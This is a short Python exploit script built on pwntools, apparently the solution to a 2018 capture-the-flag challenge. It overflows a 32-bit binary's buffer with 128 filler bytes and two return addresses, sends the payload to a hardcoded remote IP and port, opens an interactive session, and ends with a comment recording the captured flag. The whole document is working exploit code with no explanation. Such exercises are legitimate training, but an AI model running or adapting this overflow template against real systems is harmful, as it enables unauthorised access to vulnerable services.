#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='i386')
exe = './path/to/binary'

host = args.HOST or '139.162.5.230'
port = int(args.PORT or 10241)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

payload = b'A' * 128
payload += p32(0x080481ca) # ret gadget
payload += p32(0x08048d54)

io = start()
io.clean()
io.sendline(payload)
io.interactive()

# OUTPUT : HZ2018{ROP_ROP_ROP_ROP_42a27134b6f7e73c}